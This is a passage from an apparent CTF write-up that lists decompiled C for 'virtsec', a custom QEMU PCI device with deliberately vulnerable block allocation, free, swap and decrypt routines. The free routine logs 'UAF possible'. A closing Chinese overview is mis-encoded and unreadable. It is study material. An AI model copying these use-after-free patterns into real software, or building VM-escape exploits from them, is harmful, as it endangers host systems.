dev-&gt;block_id_2,</span><br><span class="line">                size,</span><br><span class="line">                v26,</span><br><span class="line">                v27);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            dev-&gt;dev_result = <span class="number">8</span>;</span><br><span class="line">            <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)qemu_loglevel_mask_64(<span class="number">2048</span>) )</span><br><span class="line">              qemu_log(</span><br><span class="line">                (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VirtSec Device: Merge failed - blocks are not adjacent after rearrangement\n&quot;</span>,</span><br><span class="line">                block_id_2,</span><br><span class="line">                v28,</span><br><span class="line">                v29,</span><br><span class="line">                v30,</span><br><span class="line">                v31);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          dev-&gt;dev_result = <span class="number">6</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">      dev_1 = (<span class="type">virtsec_device_t</span> *)DEVICE_54(dev);</span><br><span class="line">      virtsec_reset(dev_1, cmd);</span><br><span class="line">      dev-&gt;dev_result = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      dev-&gt;dev_result = <span class="number">255</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)qemu_loglevel_mask_64(<span class="number">2048</span>) )</span><br><span class="line">        qemu_log((<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VirtSec Device: Unknown command %u\n&quot;</span>, cmd, v33, v34, v35, v36);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>virtsec_unrealize</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">virtsec_unrealize</span><span class="params">(<span class="type">void</span> *opaque, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">virtsec_device_t</span> *v11; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v11 = VIRTSEC_DEVICE(opaque);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)qemu_loglevel_mask_64(<span class="number">2048</span>) )</span><br><span class="line">    qemu_log((<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VirtSec PCI Device: Cleaning up...\n&quot;</span>, a2, v2, v3, v4, v5);</span><br><span class="line">  virtsec_cleanup_all_blocks((__int64)v11);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v11-&gt;enc_pad[<span class="number">256</span>], <span class="number">0</span>, <span class="number">0x100</span>u);</span><br><span class="line">  *(_DWORD *)&amp;v11-&gt;enc_pad[<span class="number">512</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)qemu_loglevel_mask_64(<span class="number">2048</span>) )</span><br><span class="line">    qemu_log((<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VirtSec PCI Device: Cleaned up\n&quot;</span>, <span class="number">0</span>, v6, v7, v8, v9);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>virtsec_find_block</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">virtsec_block_t</span> *__fastcall <span class="title function_">virtsec_find_block</span><span class="params">(<span class="type">virtsec_device_t</span> *dev, u32 block_id)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( dev-&gt;block_list[i].valid &amp;&amp; block_id == dev-&gt;block_list[i].id )</span><br><span class="line">      <span class="keyword">return</span> &amp;dev-&gt;block_list[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>virtsec_allocate_block</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">virtsec_block_t</span> *__fastcall <span class="title function_">virtsec_allocate_block</span><span class="params">(<span class="type">virtsec_device_t</span> *dev, <span class="type">unsigned</span> <span class="type">int</span> block_id, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> i_1; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">virtsec_block_t</span> *v13; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  i_1 = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !virtsec_validate_block_size(size) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( dev-&gt;block_list[i].valid != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v13 = &amp;dev-&gt;block_list[i];</span><br><span class="line">      i_1 = i;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v13 )</span><br><span class="line">  &#123;</span><br><span class="line">    v13-&gt;id = block_id;</span><br><span class="line">    v13-&gt;size = size;</span><br><span class="line">    v13-&gt;reserved = <span class="number">0</span>;</span><br><span class="line">    v13-&gt;start = <span class="number">16</span> * i_1;</span><br><span class="line">    v13-&gt;pad_index = <span class="number">16</span> * i_1;</span><br><span class="line">    v13-&gt;enc_flag = <span class="number">0</span>;</span><br><span class="line">    v13-&gt;valid = <span class="number">1</span>;</span><br><span class="line">    v13-&gt;freed = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;dev-&gt;data_buffer[v13-&gt;start], <span class="number">0</span>, <span class="number">0x10</span>u);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;dev-&gt;enc_pad[v13-&gt;pad_index], <span class="number">0</span>, <span class="number">0x10</span>u);</span><br><span class="line">    ++dev-&gt;reg_3464;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)qemu_loglevel_mask_64(<span class="number">2048</span>) )</span><br><span class="line">      qemu_log(</span><br><span class="line">        (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VirtSec Device: Allocated block %u (%u bytes) at offset 0x%x\n&quot;</span>,</span><br><span class="line">        block_id,</span><br><span class="line">        size,</span><br><span class="line">        v13-&gt;start,</span><br><span class="line">        v8,</span><br><span class="line">        v9);</span><br><span class="line">    <span class="keyword">return</span> v13;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)qemu_loglevel_mask_64(<span class="number">2048</span>) )</span><br><span class="line">      qemu_log((<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VirtSec Device: No free blocks available\n&quot;</span>, block_id, v4, v5, v6, v7);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>virtsec_free_block</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">virtsec_free_block</span><span class="params">(<span class="type">virtsec_device_t</span> *dev, <span class="type">virtsec_block_t</span> *blk)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r9d</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( blk &amp;&amp; blk-&gt;valid )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)qemu_loglevel_mask_64(<span class="number">2048</span>) )</span><br><span class="line">      qemu_log((<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VirtSec Device: Freeing block %u at offset 0x%x\n&quot;</span>, blk-&gt;id, blk-&gt;start, v2, v3, v4);</span><br><span class="line">    blk-&gt;freed = <span class="number">1</span>;</span><br><span class="line">    blk-&gt;valid = <span class="number">0</span>;</span><br><span class="line">    --dev-&gt;reg_3464;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)qemu_loglevel_mask_64(<span class="number">2048</span>) )</span><br><span class="line">      qemu_log((<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VirtSec Device: Block %u freed (UAF possible)\n&quot;</span>, blk-&gt;id, v5, v6, v7, v8);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>virtsec_cleanup_all_blocks</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">virtsec_cleanup_all_blocks</span><span class="params">(<span class="type">virtsec_device_t</span> *dev)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( dev-&gt;block_list[i].valid )</span><br><span class="line">      virtsec_free_block(dev, &amp;dev-&gt;block_list[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>virtsec_find_block_index</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">virtsec_find_block_index</span><span class="params">(<span class="type">virtsec_device_t</span> *dev, <span class="type">unsigned</span> <span class="type">int</span> block_id)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( dev-&gt;block_list[i].valid &amp;&amp; block_id == dev-&gt;block_list[i].id )</span><br><span class="line">      <span class="keyword">return</span> i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>virtsec_swap_blocks</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">virtsec_swap_blocks</span><span class="params">(<span class="type">virtsec_device_t</span> *dev, <span class="type">unsigned</span> <span class="type">int</span> block_index, <span class="type">unsigned</span> <span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int8 *v3; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *v5; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *v7; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *v8; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v9; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">virtsec_block_t</span> *v10; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">virtsec_block_t</span> *v15; <span class="comment">// [rsp+10h] [rbp-60h]</span></span><br><span class="line">  <span class="type">virtsec_block_t</span> *v16; <span class="comment">// [rsp+18h] [rbp-58h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [rsp+20h] [rbp-50h]</span></span><br><span class="line">  __int64 v18; <span class="comment">// [rsp+28h] [rbp-48h]</span></span><br><span class="line">  __int64 v19; <span class="comment">// [rsp+30h] [rbp-40h]</span></span><br><span class="line">  __int64 v20; <span class="comment">// [rsp+40h] [rbp-30h]</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp+48h] [rbp-28h]</span></span><br><span class="line">  __int64 v22; <span class="comment">// [rsp+50h] [rbp-20h]</span></span><br><span class="line">  __int64 v23; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( block_index &lt; <span class="number">0x10</span> &amp;&amp; i &lt; <span class="number">0x10</span> &amp;&amp; block_index != i )</span><br><span class="line">  &#123;</span><br><span class="line">    v15 = &amp;dev-&gt;block_list[block_index];</span><br><span class="line">    v16 = &amp;dev-&gt;block_list[i];</span><br><span class="line">    v20 = *(_QWORD *)&amp;dev-&gt;data_buffer[dev-&gt;block_list[block_index].start];</span><br><span class="line">    v21 = *(_QWORD *)&amp;dev-&gt;data_buffer[dev-&gt;block_list[block_index].start + <span class="number">8</span>];</span><br><span class="line">    v22 = *(_QWORD *)&amp;dev-&gt;enc_pad[dev-&gt;block_list[block_index].pad_index];</span><br><span class="line">    v23 = *(_QWORD *)&amp;dev-&gt;enc_pad[dev-&gt;block_list[block_index].pad_index + <span class="number">8</span>];</span><br><span class="line">    v3 = &amp;dev-&gt;data_buffer[dev-&gt;block_list[block_index].start];</span><br><span class="line">    v4 = *(_QWORD *)&amp;dev-&gt;data_buffer[dev-&gt;block_list[i].start + <span class="number">8</span>];</span><br><span class="line">    *(_QWORD *)v3 = *(_QWORD *)&amp;dev-&gt;data_buffer[dev-&gt;block_list[i].start];</span><br><span class="line">    *((_QWORD *)v3 + <span class="number">1</span>) = v4;</span><br><span class="line">    v5 = &amp;dev-&gt;enc_pad[dev-&gt;block_list[block_index].pad_index];</span><br><span class="line">    v6 = *(_QWORD *)&amp;dev-&gt;enc_pad[dev-&gt;block_list[i].pad_index + <span class="number">8</span>];</span><br><span class="line">    *(_QWORD *)v5 = *(_QWORD *)&amp;dev-&gt;enc_pad[dev-&gt;block_list[i].pad_index];</span><br><span class="line">    *((_QWORD *)v5 + <span class="number">1</span>) = v6;</span><br><span class="line">    v7 = &amp;dev-&gt;data_buffer[dev-&gt;block_list[i].start];</span><br><span class="line">    *(_QWORD *)v7 = v20;</span><br><span class="line">    *((_QWORD *)v7 + <span class="number">1</span>) = v21;</span><br><span class="line">    v8 = &amp;dev-&gt;enc_pad[dev-&gt;block_list[i].pad_index];</span><br><span class="line">    *(_QWORD *)v8 = v22;</span><br><span class="line">    *((_QWORD *)v8 + <span class="number">1</span>) = v23;</span><br><span class="line">    v17 = *(_QWORD *)&amp;v15-&gt;id;</span><br><span class="line">    v18 = *(_QWORD *)&amp;dev-&gt;block_list[block_index].reserved;</span><br><span class="line">    v19 = *(_QWORD *)&amp;dev-&gt;block_list[block_index].pad_index;</span><br><span class="line">    v9 = *(_QWORD *)&amp;dev-&gt;block_list[i].reserved;</span><br><span class="line">    *(_QWORD *)&amp;v15-&gt;id = *(_QWORD *)&amp;v16-&gt;id;</span><br><span class="line">    *(_QWORD *)&amp;v15-&gt;reserved = v9;</span><br><span class="line">    *(_QWORD *)&amp;v15-&gt;pad_index = *(_QWORD *)&amp;dev-&gt;block_list[i].pad_index;</span><br><span class="line">    v10 = &amp;dev-&gt;block_list[i];</span><br><span class="line">    *(_QWORD *)&amp;v16-&gt;id = v17;</span><br><span class="line">    *(_QWORD *)&amp;v10-&gt;reserved = v18;</span><br><span class="line">    *(_QWORD *)&amp;v10-&gt;pad_index = v19;</span><br><span class="line">    v15-&gt;start = <span class="number">16</span> * block_index;</span><br><span class="line">    v15-&gt;pad_index = <span class="number">16</span> * block_index;</span><br><span class="line">    v16-&gt;start = <span class="number">16</span> * i;</span><br><span class="line">    v16-&gt;pad_index = <span class="number">16</span> * i;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)qemu_loglevel_mask_64(<span class="number">2048</span>) )</span><br><span class="line">      qemu_log((<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VirtSec Device: Swapped blocks at index %d and %d\n&quot;</span>, block_index, i, v11, v12, v13);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p><strong>virtsec_validate_block_size</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">virtsec_validate_block_size</span><span class="params">(u32 reg_3068)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> reg_3068 &amp;&amp; reg_3068 &lt;= <span class="number">0x10</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>virtsec_decrypt_block</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">virtsec_decrypt_block</span><span class="params">(<span class="type">virtsec_device_t</span> *dev, <span class="type">virtsec_block_t</span> *blk)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( blk )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( blk-&gt;enc_flag == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memcpy</span>(&amp;dev-&gt;data_buffer[blk-&gt;start], &amp;dev-&gt;enc_pad[blk-&gt;pad_index], blk-&gt;reserved);</span><br><span class="line">      virtsec_xor_encrypt((__int64)&amp;dev-&gt;data_buffer[blk-&gt;start], blk-&gt;reserved, (__int64)&amp;dev-&gt;enc_pad[<span class="number">516</span>], <span class="number">0x20</span>u);</span><br><span class="line">      blk-&gt;enc_flag = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>virtsec_reset</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">virtsec_reset</span><span class="params">(<span class="type">virtsec_device_t</span> *dev, <span class="type">int</span> unused)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">virtsec_device_t</span> *deva; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  deva = VIRTSEC_DEVICE(dev);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)qemu_loglevel_mask_64(<span class="number">2048</span>) )</span><br><span class="line">    qemu_log((<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VirtSec Device: Resetting...\n&quot;</span>, unused, v2, v3, v4, v5);</span><br><span class="line">  deva-&gt;reg_3024 = <span class="number">0</span>;</span><br><span class="line">  deva-&gt;cmd_arg = <span class="number">0</span>;</span><br><span class="line">  deva-&gt;dev_result = <span class="number">0</span>;</span><br><span class="line">  deva-&gt;dev_size = <span class="number">0</span>;</span><br><span class="line">  deva-&gt;unk_3072 = <span class="number">0</span>;</span><br><span class="line">  deva-&gt;reg_3076 = <span class="number">0</span>;</span><br><span class="line">  virtsec_cleanup_all_blocks(deva);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;deva-&gt;enc_pad[<span class="number">256</span>], <span class="number">0</span>, <span class="number">0x100</span>u);</span><br><span class="line">  *(_DWORD *)&amp;deva-&gt;enc_pad[<span class="number">512</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)qemu_loglevel_mask_64(<span class="number">2048</span>) )</span><br><span class="line">    qemu_log((<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VirtSec Device: Reset completed\n&quot;</span>, <span class="number">0</span>, v6, v7, v8, v9);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>é¢˜ç›®æ¦‚è§ˆ</strong></p>
<ul>
<li>è‡ªå®šä¹‰ PCI è®¾å¤‡ virtsec è¢«ç¼–è¯‘è¿› QEMUï¼Œæš´éœ²ä¸€æ®µ MMIO å¯„å­˜å™¨ä¸ä¸€æ®µæ•°æ®çª—å£ä¾›è®¿å®¢è®¿é—®  </li>
<li>å…³é”®å›è°ƒï¼š<ul>
<li>virtsec_mmio_read </li>
<li>virtsec_mmio_write </li>
<li>å‘½ä»¤åˆ†å‘ virtsec_execute_command</li>
</ul>
</li>
</ul>
<p><strong>è®¾å¤‡ç»“æ„</strong></p>
<ul>
<li>å†…å­˜å¸ƒå±€ï¼ˆæ ¸å¿ƒå­—æ®µï¼‰ï¼š<ul>
<li>dev-&gt;data_buffer ï¼šé•¿åº¦ 256 å­—èŠ‚ï¼Œåˆ†æˆ 16 ä¸ªæ§½ï¼Œæ¯æ§½ 16 å­—èŠ‚ï¼Œç”¨äºå—æ•°æ®</li>
<li>dev-&gt;block_list[16] ï¼šå—å…ƒæ•°æ®æ•°ç»„ï¼Œæ¯ä¸ªå—è®°å½• id&#x2F;start&#x2F;size&#x2F;valid&#x2F;enc_flag&#x2F;freed ç­‰</li>
